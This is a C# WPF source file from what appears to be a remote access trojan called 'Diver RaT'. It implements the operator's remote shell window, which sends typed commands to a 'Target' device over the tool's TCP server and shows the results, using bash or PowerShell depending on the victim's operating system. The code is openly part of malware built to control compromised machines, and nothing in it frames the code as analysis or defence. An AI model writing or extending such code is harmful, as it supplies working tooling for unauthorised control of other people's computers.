using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;

namespace Diver_RaT
{
    public partial class ShellWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly List<string> _history = new();
        private readonly string _prompt;
        private int _historyIndex;
        private bool _busy;

        private static readonly SolidColorBrush CommandBrush = Brush("#D6FF7A");
        private static readonly SolidColorBrush OutputBrush = Brush("#E6E8EF");
        private static readonly SolidColorBrush ErrorBrush = Brush("#FF6B6B");

        public ShellWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            var isLinux = string.Equals(device.DeviceType, "Linux", StringComparison.OrdinalIgnoreCase);
            _prompt = isLinux ? "$ " : "PS C:\\> ";
            Title = $"Remote Shell - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            Append($"Diver RaT remote shell - {(isLinux ? "bash" : "PowerShell")}", OutputBrush);
            Append($"Target: {device.ComputerName} ({device.IpAddress})", OutputBrush);
            Append("Type a command and press Enter. Use Up/Down for command history.", OutputBrush);
            Append("", OutputBrush);

            Loaded += (_, _) => InputBox.Focus();
        }

        private void InputBox_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.Key)
            {
                case Key.Enter:
                    e.Handled = true;
                    RunCommand();
                    break;
                case Key.Up:
                    e.Handled = true;
                    History(-1);
                    break;
                case Key.Down:
                    e.Handled = true;
                    History(1);
                    break;
            }
        }

        private void History(int dir)
        {
            if (_history.Count == 0) return;
            if (dir < 0)
            {
                if (_historyIndex <= 0) _historyIndex = _history.Count;
                _historyIndex--;
            }
            else
            {
                if (_historyIndex >= _history.Count - 1)
                {
                    _historyIndex = _history.Count;
                    InputBox.Text = "";
                    return;
                }
                _historyIndex++;
            }
            InputBox.Text = _history[_historyIndex];
            InputBox.CaretIndex = InputBox.Text.Length;
        }

        private async void RunCommand()
        {
            var cmd = InputBox.Text.Trim();
            if (string.IsNullOrEmpty(cmd) || _busy) return;

            if (cmd.Equals("clear", StringComparison.OrdinalIgnoreCase) ||
                cmd.Equals("cls", StringComparison.OrdinalIgnoreCase))
            {
                OutputBox.Document.Blocks.Clear();
                InputBox.Clear();
                StatusText.Text = "Terminal cleared";
                InputBox.Focus();
                return;
            }

            _busy = true;
            StatusText.Text = $"Running: {cmd}";
            Append(_prompt + cmd, CommandBrush);
            _history.Add(cmd);
            _historyIndex = _history.Count;
            InputBox.Clear();

            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "SHELL",
                    new Dictionary<string, string> { ["cmd"] = cmd });

                if (result.Success)
                    Append(string.IsNullOrEmpty(result.Result) ? "(no output)" : result.Result.Trim(), OutputBrush);
                else
                    Append($"[error] {result.Error}", ErrorBrush);
                StatusText.Text = result.Success ? "Command completed" : $"Failed: {result.Error}";
            }
            catch (Exception ex)
            {
                Append($"[error] {ex.Message}", ErrorBrush);
                StatusText.Text = "Command failed";
            }
            finally
            {
                _busy = false;
                InputBox.Focus();
            }
        }

        private void Append(string text, SolidColorBrush brush)
        {
            if (string.IsNullOrEmpty(text))
            {
                OutputBox.Document.Blocks.Add(new Paragraph { Margin = new Thickness(0), Padding = new Thickness(0) });
            }
            else
            {
                foreach (var line in text.Replace("\r\n", "\n").Split('\n'))
                {
                    var para = new Paragraph(new Run(line) { Foreground = brush })
                    {
                        Margin = new Thickness(0),
                        Padding = new Thickness(0)
                    };
                    OutputBox.Document.Blocks.Add(para);
                }
            }
            OutputBox.ScrollToEnd();
        }

        private static SolidColorBrush Brush(string hex) =>
            (SolidColorBrush)new BrushConverter().ConvertFromString(hex);
    }
}
